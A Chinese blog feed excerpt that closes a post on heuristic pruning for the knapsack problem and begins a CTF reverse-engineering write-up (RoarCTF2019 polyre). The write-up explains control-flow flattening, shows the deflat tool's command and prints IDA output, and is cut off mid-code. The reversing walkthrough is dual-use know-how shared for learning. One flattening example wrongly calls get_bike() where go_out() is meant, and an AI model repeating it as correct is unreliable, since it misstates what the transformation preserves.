class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 10001</span></span><br><span class="line"><span class="keyword">int</span> v[maxn],c[maxn];</span><br><span class="line"><span class="keyword">int</span> ans=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> n,m;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">f</span><span class="params">(<span class="keyword">int</span> x)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ans=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=x+<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        ans+=v[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">search</span><span class="params">(<span class="keyword">int</span> now,<span class="keyword">int</span> contain,<span class="keyword">int</span> value)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(value&gt;ans)ans=value;</span><br><span class="line">    <span class="keyword">if</span>(now&gt;n)<span class="keyword">return</span> ;</span><br><span class="line">    <span class="keyword">if</span>(contain&gt;=c[now])</span><br><span class="line">        <span class="built_in">search</span>(now+<span class="number">1</span>,contain-c[now],value+v[now]);</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">f</span>(now)+value&gt;ans)</span><br><span class="line">        <span class="built_in">search</span>(now+<span class="number">1</span>,contain,value);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>,&amp;m,&amp;n);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>,&amp;c[i],&amp;v[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">search</span>(<span class="number">1</span>,m,<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,ans);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以算出正确结果，但是有些点会T</p><p><img src="/2021/12/15/%E5%90%AF%E5%8F%91%E5%BC%8F%E6%90%9C%E7%B4%A2%E7%AE%97%E6%B3%95/1.png" alt="1"></p><p>事实上我这样的启发式搜索方法还是有点暴力，因为后面的物品可能完全一个都放不进去，但是价值很大，这样的数据启发式搜索就会退化成朴素算法。</p><p>那么我如果换一种，我不管什么就一个个放进去看看能有多少最大的价值，为了保证能朴素地算出最大值我们可以先对物品的单位价值排序然后一个个放，而且我们需要假设物品可以分割。那不然的话等于是在后面的物品做一次动态规划，复杂度还是比较高的。所以我们可以得出估值函数：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">f</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> res)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ans=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=x+<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(res&gt;c[i])&#123;</span><br><span class="line">            ans+=v[i];</span><br><span class="line">            res-=c[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> ans+d[i]*res;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后写出以下的代码:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 10001</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">item</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> c,v;</span><br><span class="line">    <span class="keyword">double</span> d;</span><br><span class="line">&#125;a[maxn];</span><br><span class="line"><span class="keyword">int</span> ans=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> n,m;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">f</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> res)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ans=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=x+<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(res&gt;a[i].c)&#123;</span><br><span class="line">            ans+=a[i].v;</span><br><span class="line">            res-=a[i].c;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> ans+(<span class="keyword">int</span>)(a[i].d*res);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">search</span><span class="params">(<span class="keyword">int</span> now,<span class="keyword">int</span> contain,<span class="keyword">int</span> value)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(value&gt;ans)ans=value;</span><br><span class="line">    <span class="keyword">if</span>(now&gt;n)<span class="keyword">return</span> ;</span><br><span class="line">    <span class="keyword">if</span>(contain&gt;=a[now].c)</span><br><span class="line">        <span class="built_in">search</span>(now+<span class="number">1</span>,contain-a[now].c,value+a[now].v);</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">f</span>(now,contain)+value&gt;ans)</span><br><span class="line">        <span class="built_in">search</span>(now+<span class="number">1</span>,contain,value);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">bool</span> <span class="keyword">operator</span>&lt;(<span class="keyword">const</span> item &amp;a, <span class="keyword">const</span> item &amp;b)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> a.d &gt; b.d;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">int cmp(item a,item b)&#123;</span></span><br><span class="line"><span class="comment">    if(a.d&lt;b.d)return 0;</span></span><br><span class="line"><span class="comment">    return 1;</span></span><br><span class="line"><span class="comment">&#125;*/</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>,&amp;m,&amp;n);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>,&amp;a[i].c,&amp;a[i].v);</span><br><span class="line">        a[i].d=(<span class="keyword">double</span>)a[i].v/a[i].c;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">sort</span>(a+<span class="number">1</span>,a+<span class="number">1</span>+n);</span><br><span class="line">    <span class="built_in">search</span>(<span class="number">1</span>,m,<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,ans);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>成功AC。</p><p><img src="/2021/12/15/%E5%90%AF%E5%8F%91%E5%BC%8F%E6%90%9C%E7%B4%A2%E7%AE%97%E6%B3%95/2.png" alt="2"></p><p>由此可见，只要我们选的估值函数够好，那么搜索它就不会那么暴力了，这大概也是启发式搜索算法的精髓，只要估值函数选的好，复杂度能直接从指数级降到(其实我也不知道是多少hhh)，但是个人觉得，只要估值函数写出来了，都是没问题的，因为代码量本身就很少，只是在做决策之前估计以下这一步到底值不值得就好了，然后就是递归大法好，可以看到我的search函数本身就这几句。</p><p>那么在这样的搜索里面启发式算法的估值函数很容易求，但是如果是迷宫类的问题，启发式算法还真的就难说了，等明天去看看迷宫类的启发式搜索吧。</p>]]></content>
      
      
      <categories>
          
          <category> icpc </category>
          
          <category> algorithm </category>
          
          <category> search </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>RoarCTF2019 polyre writeup writeup</title>
      <link href="/2021/12/15/%5BRoarCTF2019%5Dpolyre%20writeup/"/>
      <url>/2021/12/15/%5BRoarCTF2019%5Dpolyre%20writeup/</url>
      
        <content type="html"><![CDATA[<p>buu刷题记录-<a href="https://buuoj.cn/challenges#[RoarCTF2019]polyre">RoarCTF2019 polyre</a></p><span id="more"></span><h2 id="初步分析"><a href="#初步分析" class="headerlink" title="初步分析"></a>初步分析</h2><p>拿到文件ida打开，发现是很绝望的究极无敌的代码混淆——控制流平坦化。</p><p><img src="/2021/12/15/[RoarCTF2019]polyre%20writeup/1.png" alt="1"></p><h3 id="控制流平坦化介绍"><a href="#控制流平坦化介绍" class="headerlink" title="控制流平坦化介绍"></a>控制流平坦化介绍</h3><p>控制流平坦化(control flow flattening)的基本思想主要是通过一个主分发器来控制程序基本块的执行流程，例如下图是正常的执行流程 </p><p><img src="/2021/12/15/[RoarCTF2019]polyre%20writeup/2.png" alt="2"></p><p>在经过控制流平台化的混淆之后，会变成如下的结构</p><p><img src="/2021/12/15/[RoarCTF2019]polyre%20writeup/3.png" alt="3"></p><p>流程图看起来就像是同一级的关系，块之间失去了层次分明，逻辑可读性变得更差。</p><p>就好比我们平时做的堆菜单题，选择菜单的时候，逻辑基本就是</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">    menu();</span><br><span class="line">    <span class="keyword">int</span> num=getnum();</span><br><span class="line">    <span class="keyword">switch</span>(num)&#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            add();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            edit();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">            <span class="keyword">delete</span>();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">            show();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            error_choice();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是有时候经过ida反编译并不是那么清晰的，我也不知道它是不是特意加了混淆还是ida本身的问题，反编译代码变成了下面的情况</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">            <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">                <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">                    menu();</span><br><span class="line">                    <span class="keyword">int</span> num=getnum();</span><br><span class="line">                    <span class="keyword">if</span>(num!=<span class="number">1</span>)&#123;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    add();</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(num&gt;<span class="number">2</span>)&#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                edit();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(num!=<span class="number">3</span>)&#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            show();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(num!=<span class="number">4</span>)&#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        edit();</span><br><span class="line">    &#125;</span><br><span class="line">    error_choice;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这么说吧，两个代码实现的功能是一样的，但是明显下面的可读性就变差了很多。我也不知道是不是这个在作妖，就是觉得很像，提出来讲一讲hhh。</p><p>但是好像又没有关系，因为它们块之间的关系本来就是平坦的，后面只是用while替代switch进行进一步混淆，但是其实有menu函数一看便知，所以它在这里加这样的逻辑混淆的确是无用功。</p><p>那么我猜控制流平坦化的流程就是：</p><p>①将所有块平坦化</p><p>②用switch分发</p><p>③把switch转成如上的那种while循环包起来的代码。</p><p>至于平坦化了之后如何实现前后的逻辑的关系呢？其实很简单，比如下面这个逻辑</p><p>假如明天下雨，那么我带伞，然后出门，否则我带上我的自行车，然后出门，写成伪代码是下面的逻辑</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (rain)&#123;</span><br><span class="line">    get_umb();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    get_bike();</span><br><span class="line">&#125;</span><br><span class="line">go_out();</span><br></pre></td></tr></table></figure><p>代码这么写起来看起来逻辑还是十分清晰的，那么如果加控制流平坦化混淆它会变成什么样呢？这里很明显出现三个语句块，如果rain条件成立，那么get_umb()，否则get_bike()，最后一定会执行go_out()。那么get_umb和get_bike就是一个二选一的关系，这俩块跟go_out又是先后的关系，这是我们一眼可以看出来的逻辑。</p><p>控制流平坦化第一步就是拆掉他们这样的逻辑关系，甭管有多少块，全部用while(1)+switch去控制，如下代码所示。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">    ch=rain;</span><br><span class="line">    <span class="keyword">switch</span>(ch)&#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0</span>：</span><br><span class="line">            get_bike();</span><br><span class="line">            ch=<span class="number">2</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            get_umb();</span><br><span class="line">            ch=<span class="number">2</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            get_bike();</span><br><span class="line">            flag=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(flag)&#123;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以发现平坦化了之后略微有一点点不可读，但是还能接受，但是它往往不会让你看的那么容易，因为它ch不可能就1，2，3，4这么给你弄好了，我再进一步加混淆。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">    ch=(rain*<span class="number">2</span>+<span class="number">9876</span>)*<span class="number">9</span>+<span class="number">100</span>;</span><br><span class="line">    <span class="keyword">switch</span>(ch)&#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">88984</span>：</span><br><span class="line">            get_bike();</span><br><span class="line">            ch=ch*<span class="number">9</span>+<span class="number">1</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">89002</span>:</span><br><span class="line">            get_umb();</span><br><span class="line">            ch=(ch<span class="number">-18</span>)*<span class="number">9</span>+<span class="number">1</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">800857</span>:</span><br><span class="line">            get_bike();</span><br><span class="line">            flag=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(flag)&#123;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果块再多，运算再复杂，你可能都不能一眼看出来下不下雨和带不带伞是一个什么联系了。</p><p>然后switch再同如上的menu这样变换一下逻辑，就更难读了，也就是我们题目中看到的这个样子，可以发现，它平坦的块已经是特别密集了，疯狂while(1)然后中间条件判断去break。</p><p>以上分析均为自己个人理解，并使用自己最朴素的语言讲述出来的。</p><h3 id="抵抗控制流平坦化"><a href="#抵抗控制流平坦化" class="headerlink" title="抵抗控制流平坦化"></a>抵抗控制流平坦化</h3><p>既然有人研究出了这样的代码混淆，自然也有人研究出了对应的解法，这里放项目地址<a href="https://github.com/cq674350529/deflat">https://github.com/cq674350529/deflat</a></p><p>该项目以angr作为依赖，在个人使用的时候我把它源码download下来还需要把它flat_control_flow目录下的deflat.py移动到上一层目录才能正常使用，使用方式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$python(3) deflat.py -f [file_name] --addr [function_addr]</span><br></pre></td></tr></table></figure><p>这里function_addr即为添加了此混淆的函数地址。放着跑个几分钟，就能跑出来一个控制流比较清晰的elf文件了。</p><p><img src="/2021/12/15/[RoarCTF2019]polyre%20writeup/4.png" alt="4"></p><h2 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h2><p>我们用ida反编译能得到以下代码</p><figure class="highlight cc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">main</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> __int64 v4; <span class="comment">// [rsp+1E0h] [rbp-110h]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+1E8h] [rbp-108h]</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// [rsp+1ECh] [rbp-104h]</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// [rsp+1ECh] [rbp-104h]</span></span><br><span class="line">  <span class="keyword">char</span> s1[<span class="number">48</span>]; <span class="comment">// [rsp+1F0h] [rbp-100h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">60</span>]; <span class="comment">// [rsp+220h] [rbp-D0h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v10; <span class="comment">// [rsp+25Ch] [rbp-94h]</span></span><br><span class="line">  <span class="keyword">char</span> *v11; <span class="comment">// [rsp+260h] [rbp-90h]</span></span><br><span class="line">  <span class="keyword">int</span> v12; <span class="comment">// [rsp+26Ch] [rbp-84h]</span></span><br><span class="line">  <span class="keyword">bool</span> v13; <span class="comment">// [rsp+272h] [rbp-7Eh]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 v14; <span class="comment">// [rsp+273h] [rbp-7Dh]</span></span><br><span class="line">  <span class="keyword">int</span> v15; <span class="comment">// [rsp+274h] [rbp-7Ch]</span></span><br><span class="line">  <span class="keyword">char</span> *v16; <span class="comment">// [rsp+278h] [rbp-78h]</span></span><br><span class="line">  <span class="keyword">int</span> v17; <span class="comment">// [rsp+284h] [rbp-6Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v18; <span class="comment">// [rsp+288h] [rbp-68h]</span></span><br><span class="line">  <span class="keyword">bool</span> v19; <span class="comment">// [rsp+28Fh] [rbp-61h]</span></span><br><span class="line">  <span class="keyword">char</span> *v20; <span class="comment">// [rsp+290h] [rbp-60h]</span></span><br><span class="line">  <span class="keyword">int</span> v21; <span class="comment">// [rsp+298h] [rbp-58h]</span></span><br><span class="line">  <span class="keyword">bool</span> v22; <span class="comment">// [rsp+29Fh] [rbp-51h]</span></span><br><span class="line">  __int64 v23; <span class="comment">// [rsp+2A0h] [rbp-50h]</span></span><br><span class="line">  <span class="keyword">bool</span> v24; <span class="comment">// [rsp+2AFh] [rbp-41h]</span></span><br><span class="line">  __int64 v25; <span class="comment">// [rsp+2B0h] [rbp-40h]</span></span><br><span class="line">  __int64 v26; <span class="comment">// [rsp+2B8h] [rbp-38h]</span></span><br><span class="line">  __int64 v27; <span class="comment">// [rsp+2C0h] [rbp-30h]</span></span><br><span class="line">  __int64 v28; <span class="comment">// [rsp+2C8h] [rbp-28h]</span></span><br><span class="line">  <span class="keyword">int</span> v29; <span class="comment">// [rsp+2D0h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">int</span> v30; <span class="comment">// [rsp+2D4h] [rbp-1Ch]</span></span><br><span class="line">  <span class="keyword">char</span> *v31; <span class="comment">// [rsp+2D8h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">int</span> v32; <span class="comment">// [rsp+2E0h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> v33; <span class="comment">// [rsp+2E4h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">bool</span> v34; <span class="comment">// [rsp+2EBh] [rbp-5h]</span></span><br><span class="line"></span><br><span class="line">  v10 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x30</span>uLL);</span><br><span class="line">  <span class="built_in">memset</span>(s1, <span class="number">0</span>, <span class="built_in"><span class="keyword">sizeof</span></span>(s1));</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Input:&quot;</span>);</span><br><span class="line">  v11 = s;</span><br><span class="line">  <span class="keyword">if</span> ( dword_603058 &gt;= <span class="number">10</span> &amp;&amp; ((((_BYTE)dword_603054 - <span class="number">1</span>) * (_BYTE)dword_603054) &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_43;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%s&quot;</span>, v11);</span><br><span class="line">    v6 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( dword_603058 &lt; <span class="number">10</span> || ((((_BYTE)dword_603054 - <span class="number">1</span>) * (_BYTE)dword_603054) &amp; <span class="number">1</span>) == <span class="number">0</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">LABEL_43:</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%s&quot;</span>, v11);</span><br><span class="line">  